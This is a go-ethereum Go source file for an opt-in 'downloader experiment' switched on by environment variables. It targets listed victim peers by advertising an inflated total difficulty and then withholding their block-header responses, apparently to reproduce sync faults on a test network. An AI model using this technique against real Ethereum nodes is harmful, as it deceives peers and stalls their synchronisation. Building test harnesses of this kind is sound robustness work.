// Copyright 2026 The go-ethereum Authors
// This file is part of the go-ethereum library.

package eth

import (
	"errors"
	"fmt"
	"math/big"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"

	"github.com/ethereum/go-ethereum/log"
)

const (
	downloaderExperimentEnabledEnv  = "CORE_GETH_DOWNLOADER_EXPERIMENT_ENABLED"
	downloaderExperimentNetworkEnv  = "CORE_GETH_DOWNLOADER_EXPERIMENT_NETWORK_ID"
	downloaderExperimentVictimsEnv  = "CORE_GETH_DOWNLOADER_EXPERIMENT_VICTIM_IDS"
	downloaderExperimentTDOffsetEnv = "CORE_GETH_DOWNLOADER_EXPERIMENT_TD_OFFSET"
	downloaderExperimentAfterEnv    = "CORE_GETH_DOWNLOADER_EXPERIMENT_AFTER_REQUESTS"
	downloaderExperimentMaxCallsEnv = "CORE_GETH_DOWNLOADER_EXPERIMENT_MAX_TRIGGERS"
)

type downloaderExperimentConfig struct {
	networkID     uint64
	victims       map[string]struct{}
	tdOffset      *big.Int
	afterRequests uint64
	maxTriggers   uint64
	requests      atomic.Uint64
	triggers      atomic.Uint64
	active        sync.Map
}

var (
	downloaderExperimentOnce sync.Once
	downloaderExperimentCfg  *downloaderExperimentConfig
)

func getDownloaderExperimentConfig() *downloaderExperimentConfig {
	downloaderExperimentOnce.Do(func() {
		cfg, err := loadDownloaderExperimentConfig(os.Getenv)
		if err != nil {
			log.Error("Downloader experiment configuration rejected; experiment disabled", "err", err)
			return
		}
		if cfg == nil {
			return
		}
		downloaderExperimentCfg = cfg
		log.Warn("Core-geth local downloader experiment enabled", "network", cfg.networkID,
			"victims", len(cfg.victims), "tdOffset", cfg.tdOffset,
			"afterRequests", cfg.afterRequests, "maxTriggers", cfg.maxTriggers)
	})
	return downloaderExperimentCfg
}

func loadDownloaderExperimentConfig(getenv func(string) string) (*downloaderExperimentConfig, error) {
	enabledText := strings.TrimSpace(getenv(downloaderExperimentEnabledEnv))
	enabled, err := strconv.ParseBool(enabledText)
	if err != nil && enabledText != "" {
		return nil, fmt.Errorf("invalid %s: %w", downloaderExperimentEnabledEnv, err)
	}
	if !enabled {
		return nil, nil
	}
	cfg := &downloaderExperimentConfig{}
	cfg.networkID, err = strconv.ParseUint(strings.TrimSpace(getenv(downloaderExperimentNetworkEnv)), 10, 64)
	if err != nil || cfg.networkID == 0 {
		return nil, fmt.Errorf("%s must be a non-zero decimal network ID", downloaderExperimentNetworkEnv)
	}
	cfg.victims = make(map[string]struct{})
	for _, raw := range strings.Split(getenv(downloaderExperimentVictimsEnv), ",") {
		if id := normalizeExperimentPeerID(raw); id != "" {
			cfg.victims[id] = struct{}{}
		}
	}
	if len(cfg.victims) == 0 {
		return nil, fmt.Errorf("%s must contain an exact victim node ID", downloaderExperimentVictimsEnv)
	}
	offsetText := strings.TrimSpace(getenv(downloaderExperimentTDOffsetEnv))
	if offsetText == "" {
		offsetText = "10000000"
	}
	cfg.tdOffset = new(big.Int)
	if _, ok := cfg.tdOffset.SetString(offsetText, 10); !ok || cfg.tdOffset.Sign() <= 0 {
		return nil, fmt.Errorf("%s must be a positive decimal integer", downloaderExperimentTDOffsetEnv)
	}
	if cfg.afterRequests, err = parseExperimentUint(getenv(downloaderExperimentAfterEnv)); err != nil {
		return nil, fmt.Errorf("invalid %s: %w", downloaderExperimentAfterEnv, err)
	}
	if cfg.maxTriggers, err = parseExperimentUint(getenv(downloaderExperimentMaxCallsEnv)); err != nil {
		return nil, fmt.Errorf("invalid %s: %w", downloaderExperimentMaxCallsEnv, err)
	}
	return cfg, nil
}

func parseExperimentUint(value string) (uint64, error) {
	value = strings.TrimSpace(value)
	if value == "" {
		return 0, nil
	}
	return strconv.ParseUint(value, 10, 64)
}

func normalizeExperimentPeerID(raw string) string {
	id := strings.ToLower(strings.TrimSpace(raw))
	id = strings.TrimPrefix(id, "enode://")
	if at := strings.IndexByte(id, '@'); at >= 0 {
		id = id[:at]
	}
	return id
}

func (cfg *downloaderExperimentConfig) targets(peer *Peer) bool {
	if cfg == nil || peer == nil {
		return false
	}
	_, ok := cfg.victims[normalizeExperimentPeerID(peer.ID())]
	return ok
}

func downloaderExperimentAdvertisedTD(peer *Peer, networkID uint64, td *big.Int) *big.Int {
	cfg := getDownloaderExperimentConfig()
	if cfg == nil || cfg.networkID != networkID || !cfg.targets(peer) || td == nil {
		return td
	}
	advertised := new(big.Int).Add(new(big.Int).Set(td), cfg.tdOffset)
	if advertised.BitLen() > 100 {
		peer.Log().Error("Downloader experiment TD exceeds ETH status limit; using real TD",
			"realTD", td, "offset", cfg.tdOffset, "bitlen", advertised.BitLen())
		return td
	}
	cfg.active.Store(normalizeExperimentPeerID(peer.ID()), struct{}{})
	peer.Log().Warn("Downloader experiment advertising offset TD", "realTD", td,
		"advertisedTD", advertised, "offset", cfg.tdOffset)
	return advertised
}

func downloaderExperimentInterceptHeaders(peer *Peer, query *GetBlockHeadersPacket) (bool, error) {
	cfg := getDownloaderExperimentConfig()
	if cfg == nil || !cfg.targets(peer) {
		return false, nil
	}
	peerID := normalizeExperimentPeerID(peer.ID())
	if _, ok := cfg.active.Load(peerID); !ok {
		return false, nil
	}
	requestNumber := cfg.requests.Add(1)
	if requestNumber <= cfg.afterRequests {
		return false, nil
	}
	if query == nil || query.GetBlockHeadersRequest == nil {
		return false, errors.New("downloader experiment received nil header query")
	}
	triggerNumber, ok := cfg.reserveTrigger()
	if !ok {
		return false, nil
	}
	peer.Log().Warn("Downloader experiment suppressing header response", "requestID", query.RequestId,
		"originHash", query.Origin.Hash, "originNumber", query.Origin.Number,
		"amount", query.Amount, "skip", query.Skip, "reverse", query.Reverse,
		"requestNumber", requestNumber, "triggerNumber", triggerNumber)
	return true, nil
}

func (cfg *downloaderExperimentConfig) reserveTrigger() (uint64, bool) {
	for {
		current := cfg.triggers.Load()
		if cfg.maxTriggers > 0 && current >= cfg.maxTriggers {
			return current, false
		}
		if cfg.triggers.CompareAndSwap(current, current+1) {
			return current + 1, true
		}
	}
}
